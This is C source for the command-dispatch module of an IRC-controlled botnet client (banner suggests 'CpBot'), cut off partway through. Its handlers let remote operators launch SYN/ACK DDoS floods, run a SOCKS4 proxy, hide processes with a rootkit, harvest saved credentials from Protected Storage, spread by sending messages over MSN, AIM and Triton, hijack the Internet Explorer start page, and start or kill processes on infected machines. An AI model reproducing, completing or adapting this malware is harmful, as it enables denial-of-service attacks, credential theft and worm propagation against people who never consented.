//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "includes.h"
#include "strings.h"
#include "functions.h"

extern char netinfo_title[];
extern int serversize;

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	//params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		} 
	}

	return 1;
}

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	int tnum; // for finding the number of a already running thread
	int i;	  // for misc shit
	DWORD id; // for creating new threads
	BOOL dec=FALSE;

	if (topic)
	{
		if (!lstrcmpi(cmd_login_1,a[0]) || !lstrcmpi(cmd_login_2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_logout_1,a[0]) || !lstrcmpi(cmd_logout_2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_remove_1,a[0]) || !lstrcmpi(cmd_remove_2,a[0]))
			return 1;
	}

	// stops
	if (switches.stop)
	{
		if (!lstrcmpi(cmd_threads_1,a[0]) || !lstrcmpi(cmd_threads_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,LIST_THREAD,"Thread list");
			return 1;
		}
		
#ifndef NO_PROCESS
		else if (!lstrcmpi(cmd_process_1,a[0]) || !lstrcmpi(cmd_process_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PROC_THREAD,"Process");
			return 1;
		}
#endif

#ifndef NO_DRIVEINFO
		else if (!lstrcmpi(cmd_drvinfo_1,a[0]) || !lstrcmpi(cmd_drvinfo_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DRIVE_THREAD,"Drive list");
			return 1;
		}
#endif
		
#ifndef NO_NETSTATP
		else if (!lstrcmpi(cmd_netstatp_1,a[0]) || !lstrcmpi(cmd_netstatp_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,NETSTAT_THREAD,"Netstatp");
			return 1;
		}
#endif
	
/*#ifndef NO_SNIFFER
		else if (!lstrcmpi(cmd_sniffer_1,a[0]) || !lstrcmpi(cmd_sniffer_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SNIFFER_THREAD,"Packet Sniffer");
			return 1;
		}
#endif*/

#ifndef NO_DDOS
		if (!lstrcmpi(cmd_ddos_syn, a[0]) || !lstrcmpi(cmd_ddos_ack, a[0]) || !lstrcmpi(cmd_ddos_random, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, DDOS_THREAD, "DDoS");
			return 1;
		}
#endif
		
#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstore_1, a[0]) || !lstrcmpi(cmd_pstore_2, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"PStore");
			return 1;
		}
#endif

		
#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(cmd_download_1,a[0]) || !lstrcmpi(cmd_download_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(cmd_update_1,a[0]) || !lstrcmpi(cmd_update_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif

#ifndef NO_SOCK4SERV
		else if (!lstrcmpi(cmd_socks4_1,a[0]) || !lstrcmpi(cmd_socks4_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SOCK4_THREAD,"Socks4 Server");
			return 1;
		}
#endif

		else
		{
			return 1;
		}

	}

	//////////////////////////////////////////////////////////////////////////////
	//								Login
	//			At this point the user should already be logged in
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],cmd_login_1) || !lstrcmpi(a[0],cmd_login_2))
	{
		if (switches.verbose)
			irc->privmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Servers
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(a[0],"server") || !lstrcmpi(a[0],"srv"))
	{
		if (!a[1])
		{
			irc->privmsg(hostd->target,"%s: Current Server: %i: %s:%d%s",main_title,curserver,servers[curserver].host,servers[curserver].port,(servers[curserver].usessl?" (SSL)":""));
		}
		else if (!lstrcmpi(a[1],"list"))
		{
			irc->privmsg(hostd->target,"%s Server List:", main_title);
			for (int s=0;s<serversize;s++)
			{
				irc->privmsg(hostd->target,"%i: %s:%d%s, %s",s,servers[s].host,servers[s].port,(servers[s].usessl?" (SSL)":""),servers[s].chan);
			}
			irc->privmsg(hostd->target,"%s Server List complete.", main_title);
		}
		else if (!lstrcmpi(a[1],"jump"))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,main_title);
				return 1;
			}
			if (atoi(a[2])<0 || atoi(a[2])>=serversize)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Invalid server.",main_title);
				return 1;
			}
			curserver=atoi(a[2])-1;//-1 for the ++ when it gets disconnected
			//Sleep(FLOOD_DELAY);
			irc->quit("Changing servers");
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Logout
	//////////////////////////////////////////////////////////////////////////////
	if (!lstrcmpi(cmd_logout_1, a[0]) || !lstrcmpi(cmd_logout_2, a[0]))
	{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Who
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_who,a[0]))
	{
		irc->list_logins(hostd->target);
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Remove
	//					FIXME: Add unsecure (if enabled)
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_remove_1) || !lstrcmpi(a[0],cmd_remove_2))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		ExitProcess(EXIT_SUCCESS);
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//								Threads
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_threads_1) || !lstrcmpi(a[0],cmd_threads_2))
	{
		if (a[1])
		{
			if (!lstrcmpi(cmd_threads_kill_1,a[1]) || !lstrcmpi(cmd_threads_kill_2,a[1]))
			{
				if (a[2])
				{
					if (!lstrcmpi(cmd_all,a[2]))
					{
						if ((i=killthreadall()) > 0)
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_stop,threads_title,i);
						}
						else
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_ac,threads_title);
						}
					}
					else
					{
						if (killthread(atoi(a[2])))
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_kill,threads_title,a[2]);
						}
						else 
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,str_thread_fkill,threads_title,a[2]);
						}
					}
				}
				return 1;
			}
		}
		if ((tnum=findthreadnum(LIST_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,threads_title,"Thread listing",tnum);
			return 1;
		}

		NTHREAD tlist;
		tlist.silent=switches.silent;
		tlist.verbose=switches.verbose;
		strcpy(tlist.target,hostd->target);
		tlist.conn=irc;
		tlist.bdata1 = ((a[1])?((!lstrcmpi(a[1],cmd_threads_sub))?(TRUE):(FALSE)):(FALSE)); // full list

		tlist.threadnum=addthread(LIST_THREAD,"%s Thread listing.",threads_title);
		if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
			while (tlist.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,threads_title,"Thread listing",GetLastError());
		}
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Netstatp
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_NETSTATP
	else if (!lstrcmpi(cmd_netstatp_1,a[0]) || !lstrcmpi(cmd_netstatp_2,a[0]))
	{
		if ((tnum=findthreadnum(NETSTAT_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,netstatp_title,"Netstatp thread",tnum);
			return 1;
		}
		
		NTHREAD netstat;
		netstat.silent=switches.silent;
		netstat.verbose=switches.verbose;
		strcpy(netstat.target,hostd->target);
		netstat.conn=irc;
		netstat.bdata1 = switches.netstat_all;
		netstat.bdata2 = switches.netstat_noresolve;
		netstat.bdata3 = switches.halfsilent;
		netstat.idata1 = (a[1]?atoi(a[1]):0);
		
		netstat.threadnum=addthread(NETSTAT_THREAD,"%s Netstatp thread.",netstatp_title);
		if (threads[netstat.threadnum].tHandle = CreateThread(NULL, 0, &NetstatpThread, (LPVOID)&netstat, 0, &id)) {
			while (netstat.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,netstatp_title,"Netstatp thread",GetLastError());
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								DDoS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_DDOS
	else if (!lstrcmpi(cmd_ddos_syn,a[0]) || !lstrcmpi(cmd_ddos_ack,a[0]) || !lstrcmpi(cmd_ddos_random,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->privmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		DDOS ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		if (strcmp("ddos.syn", a[0]) == 0 )
			sprintf(ddos.type,"ddos.syn");
		else if (strcmp("ddos.random", a[0]) == 0 )
			sprintf(ddos.type,"ddos.random"); 	
		else	sprintf(ddos.type,"ddos.ack");
	
		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->privmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}

#endif
	
	
	//////////////////////////////////////////////////////////////////////////////
	//								Socks4
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SOCK4SERV
	else if (!lstrcmpi(cmd_socks4_1,a[0]))
	{
		if ((tnum=findthreadnum(SOCK4_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_alr,sock4_title,"Socks4 Server",tnum);
			return 1;
		}

		NTHREAD sock4;
		sock4.silent=switches.silent;
		sock4.verbose=switches.verbose;
		strcpy(sock4.target,hostd->target);
		sock4.conn=irc;
		sock4.idata1 = (a[1]?atoi(a[1]):sock4port);
		
		sock4.threadnum=addthread(SOCK4_THREAD,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		if (threads[sock4.threadnum].tHandle = CreateThread(NULL, 0, &SocksDaemon, (LPVOID)&sock4, 0, &id)) {
			while (sock4.gotinfo == FALSE)
				Sleep(50);
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,sock4_title,"Socks4 thread",GetLastError());
		}
		return 1;
	}
   else if (!lstrcmpi(cmd_socks4_2,a[0]))
   {
   stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SOCK4_THREAD,"Socks4 Server");
   }
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Uptime
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(a[0],cmd_uptime_1) || !lstrcmpi(a[0],cmd_uptime_2))
	{
		char sendbuf[IRCLINE];	
		sprintf(sendbuf,"%s Uptime: %s",main_title,Uptime(GetTickCount(),0,TRUE));
		irc->privmsg(hostd->target,"%s.",sendbuf);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Version
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_BOTVERSION
	else if (!lstrcmpi(cmd_version_1,a[0]) || !lstrcmpi(cmd_version_2,a[0]))
	{
		if (a[1])
		{
			if (lstrcmpi(botid,a[1]))
				irc->privmsg(hostd->target,"%s %s (%s)%s",main_title,version,botid,(switches.verbose?". Built on: "__DATE__".":""));
		}
		else
			irc->privmsg(hostd->target,"%s %s (%s)%s",main_title,version,botid,(switches.verbose?". Built on: "__DATE__".":""));

		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//							Process Control
	//					-ps [list]
	//					-ps <kill> <image/pid>
	//					-ps <del> <pid> //FIXME
	//					-ps <create> <fullpathtoexe> [hide]
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
	else if (!lstrcmpi(cmd_process_1,a[0]) || !lstrcmpi(cmd_process_2,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,process_title);
			return 1;
		}

		NTHREAD process;
		process.silent=switches.silent;
		process.verbose=switches.verbose;
		strcpy(process.target,hostd->target);
		process.bdata1=FALSE; // list
		process.bdata2=FALSE; // kill
		process.bdata3=FALSE; // del
		process.conn=irc;

		if (!lstrcmpi(cmd_process_list,a[1]))
		{
			if ((tnum=findthreadnum(PROC_THREAD)) > 0)
			{
				irc->privmsg(hostd->target,str_thread_alr,process_title,"Process thread",tnum);
				return 1;
			}
			process.bdata1=TRUE;
			if (a[2])
				process.data2=a[2];//filter
			else
				process.data2=NULL;
		}
		else if (!lstrcmpi(cmd_process_kill,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			process.data1=a[2];
			process.bdata2=TRUE;  // kill
			process.bdata3=FALSE; // del
		}
		else if (!lstrcmpi(cmd_process_del,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			process.data1=a[2];
			process.bdata2=TRUE; // kill
			process.bdata3=TRUE; // del
		}
#ifndef NO_RDRIV
		else if (!lstrcmpi(cmd_process_hide,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			rkenabled=InitRK();//initialize fu
			if (rkenabled)
			{
				DWORD pstatus;
				pstatus=HideProc(atoi(a[2]));
				if (pstatus!=0)
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s PID: <%d> is now hidden.",process_title,atoi(a[2]));
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to hide PID: <%d>",process_title,atoi(a[2]));
				}
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Process hiding not initialized.",process_title);
			}
			return 1;
		}
#endif
		else if (!lstrcmpi(cmd_process_create,a[1]))
		{
			if (!a[2])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,process_title);
				return 1;
			}
			if (a[3])
				process.bdata1=TRUE;
			if (switches.createwait)
				process.bdata2=TRUE;

			char file[MAX_PATH];
			sprintf(file,a[2]);
			if (switches.replace_underscores)
			{
				char replace='_';
				if (switches.replace_char)
					replace=switches.replace_char;
				int i;
				for (i=0;i<strlen(process.data1);i++)
					if (process.data1[i]==replace)
						process.data1[i]=' ';
			}
			process.data1=file;

			process.threadnum = addthread(PROC_THREAD,"%s Create process thread.",process_title);
			if (threads[process.threadnum].tHandle = CreateThread(NULL, 0, &CreateProcThread, (LPVOID)&process, 0, &id))
			{
				while (process.gotinfo == FALSE)
					Sleep(50);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_thread_fail,process_title,"Process thread",GetLastError());
			}
			return 1;
		}
		else
		{
			return 1;
		}
		process.threadnum = addthread(PROC_THREAD,"%s Process thread.",process_title);
		if (threads[process.threadnum].tHandle = CreateThread(NULL, 0, &ProcessThread, (LPVOID)&process, 0, &id))
		{
			while (process.gotinfo == FALSE)
				Sleep(50);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,process_title,"Process thread",GetLastError());
		}
		return 1;
	}
#endif // NO_PROCESS


	//////////////////////////////////////////////////////////////////////////////
	//								Randnick
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_nickupd_1, a[0]) || !lstrcmpi(cmd_nickupd_2, a[0]))
	{
		if (NICK_TYPE != N_MINE)
			return 1;
		unsigned int ud=GetTickCount()/86400000;
		if (ud>irc->get_nicktime())
		{
			irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Randnick
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_rndnick_1, a[0]) || !lstrcmpi(cmd_rndnick_2, a[0]))
	{
		irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
		return 1;
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//								IEStart
	//				Changes the Internet Explorer startup page
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_IESTART
	else if (!lstrcmpi(cmd_iestart_1,a[0]) || !lstrcmpi(cmd_iestart_2,a[0]))
	{	
#ifndef NO_SERVICE
		ImpersonateInteractiveUser();
#endif
		if (!noadvapi32)
		{
			if (!a[1])
			{
				char *spage=RegQuery(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page");
				if (!spage)
				{
					if (!switches.silent && switches.verbose)
						irc->privmsg(hostd->target,"%s Error retrieving start page.",main_title);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Current Internet Explorer start page: %s.",main_title,spage);
				}
				return 1;
			}
			if (RegWrite(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page",a[1]))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Set Internet Explorer start page to: \"%s\"", main_title, a[1]);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to set the Internet Explorer start page.", main_title);
			}
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_noadvapi,main_title);
		}

		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Join
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_join_1,a[0]) || !lstrcmpi(cmd_join_2,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Part
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_part_1,a[0]) || !lstrcmpi(cmd_part_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
//		addlogv(MAINLOG, "%s Parted channel: '%s'.", irc_title, a[s+1]);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Raw
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_raw_1,a[0]) || !lstrcmpi(cmd_raw_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		char *raw=strchr(params,' ');
		if (raw)
		{
			raw++;//remove the space
			irc->raw(raw);
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Sent IRC raw: \"%s\".",irc_title,raw);
		}
		//else
		//{
		//	if (!silent)
		//		irc->privmsg(hostd->target,"%s Error sending raw.",irc_title);
		//}
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Prefix
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_prefix_1,a[0]) || !lstrcmpi(cmd_prefix_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		prefix = a[1][0];
		irc->privmsg(hostd->target,"%s Prefix changed to: '%c'.",main_title,a[1][0]);
		//if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
		//	addlog(MAINLOG, sendbuf);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								FlushARP
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_FLUSHARP
	else if (!lstrcmpi(cmd_flusharp_1,a[0]) || !lstrcmpi(cmd_flusharp_2,a[0]))
	{
		if (FlushARPCache())
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s ARP cache flushed.",main_title);
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to flush ARP cache.",main_title);
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								FlushDNS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_FLUSHDNS
	else if (!lstrcmpi(cmd_flushdns_1,a[0]) || !lstrcmpi(cmd_flushdns_2,a[0]))
	{
		if (fDnsFlushResolverCache)
		{
			if (fDnsFlushResolverCache())
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s DNS cache flushed.",main_title);
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to flush DNS cache.",main_title);
			}
		}
		else
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to load dnsapi.dll.",main_title);
		}
		return 1;
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								DNS
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_dns_1,a[0]) || !lstrcmpi(cmd_dns_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,main_title);
			return 1;
		}
		LPHOSTENT hostent = NULL;
		IN_ADDR iaddr;
		DWORD addr = finet_addr(a[1]);

		if (addr != INADDR_NONE)
		{
			hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
			if (hostent != NULL)
			{
				irc->privmsg(hostd->target,"%s Lookup: %s -> %s.", main_title, a[1], hostent->h_name);
				return 1;
			}
		}
		else
		{
			hostent = fgethostbyname(a[1]);
			if (hostent != NULL)
			{
				iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
				irc->privmsg(hostd->target,"%s Lookup: %s -> %s.", main_title, a[1], finet_ntoa(iaddr));
				return 1;
			}
		}
		
		irc->privmsg(hostd->target,"%s Could not resolve hostname.", main_title);
		
		return 1;
	}

		//////////////////////////////////////////////////////////////////////////////
	//								MSN Spread
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_IMSPREAD
	else if (!lstrcmpi(cmd_imspread_1,a[0]))
	{
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn.data1=IMmessage; //Message
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->privmsg(hostd->target,"%s Thread Activated: Sending Message.", imspread_title);
		}
	}

	else if(!lstrcmpi(cmd_imspread_2,a[0]))
	{
    ::killthreadid(MSNMSG_THREAD,1);
	irc->privmsg(hostd->target,"%s Thread Disabled.", imspread_title);
	}

	else if(!lstrcmpi(cmd_imspread_3,a[0]))
	{
    contactfuck(a[1]);
	}

#endif

	//////////////////////////////////////////////////////////////////////////////
	//								AIM Spread									 /
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_AIM
	else if (!lstrcmpi(cmd_aimspread_1,a[0]))
	{
		NTHREAD aim;
		aim.conn=irc;
		aim.silent=switches.silent;
		aim.verbose=switches.verbose;

		char *AIMmessage;
 		if ( !( AIMmessage = strchr(params, ' ')) )return 1;

		aim.data1=AIMmessage; //Message
		aim.threadnum = addthread(AIM_THREAD,"AIM Threads");
		if (threads[aim.threadnum].tHandle = CreateThread(NULL, 0, &AimMessage, (LPVOID)&aim, 0, &id))
		{
			while (aim.gotinfo == FALSE) Sleep(50);
				irc->privmsg(hostd->target,"%s Thread Activated: Sending Message.", aimspread_title);
		}

	else if(!lstrcmpi(cmd_aimspread_2,a[0]))
	{
		::killthreadid(AIM_THREAD,1);
		irc->privmsg(hostd->target,"%s Thread Disabled.", aimspread_title);
	}

	}

#endif
#ifndef NO_AIM
	else if (!lstrcmpi(cmd_timspread_1,a[0]))
	{
		NTHREAD tim;
		tim.conn=irc;
		tim.silent=switches.silent;
		tim.verbose=switches.verbose;

		char *TIMmessage;
 		if ( !( TIMmessage = strchr(params, ' ')) )return 1;

		tim.data1=TIMmessage; //Message
		tim.threadnum = addthread(TIM_THREAD,"TIM Threads");
		if (threads[tim.threadnum].tHandle = CreateThread(NULL, 0, &TritonMessage, (LPVOID)&tim, 0, &id))
		{
			while (tim.gotinfo == FALSE) Sleep(50);
				irc->privmsg(hostd->target,"%s Thread Activated: Sending Message.", timspread_title);
		}

	else if(!lstrcmpi(cmd_timspread_2,a[0]))
	{
		::killthreadid(TIM_THREAD,1);
		irc->privmsg(hostd->target,"%s Thread Disabled.", timspread_title);
	}

	}

#endif

	//////////////////////////////////////////////////////////////////////////////
	//							Protected storage
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSTORE
	else if (!lstrcmpi(a[0],cmd_pstore_1) || !lstrcmpi(a[0],cmd_pstore_2))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			irc->privmsg(hostd->target, str_thread_alr, pstore_title,"pstore thread", tnum);
			return 1;
		}

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstore_2)) {
			PSTORE.bdata1=TRUE;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"PStore Thread");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE)
				Sleep(50);
		}


	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Rar Inject
	//////////////////////////////////////////////////////////////////////////////
	//		  Rar Injection is a bit fucked up, copy pasted from ragebot.       //
    //////////////////////////////////////////////////////////////////////////////

	 else if (!lstrcmpi(cmd_rarspread_1,a[0]))
				{

		NTHREAD rar;
		rar.threadnum = addthread(RAR_THREAD,"RarInject Thread");
		irc->privmsg(hostd->target,"Executing Rar Injection, Please wait.");
		//RarWorm(NULL);
		return 1;
	 }

	 //////////////////////////////////////////////////////////////////////////////
	//								Visit
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_VISIT
	else if (!lstrcmpi(a[0],cmd_visit))
	{
		NTHREAD Visit;
		Visit.conn=irc;
		Visit.silent=switches.silent;
		Visit.verbose=switches.verbose;
		strcpy(Visit.target,hostd->target);
		Visit.data1=a[1];

		if (a[2] != NULL) strncpy(Visit.data2, a[2], sizeof(Visit.data2)-1);

		Visit.threadnum = addthread(VISIT_THREAD,"Visit Threads");
		if (threads[Visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&Visit, 0, &id))
		{
			while (Visit.gotinfo == FALSE) Sleep(50);
		//		irc->privmsg(hostd->target,"%s Visiting Website Now", visit_title);
		}


	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//							System info
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SYSINFO
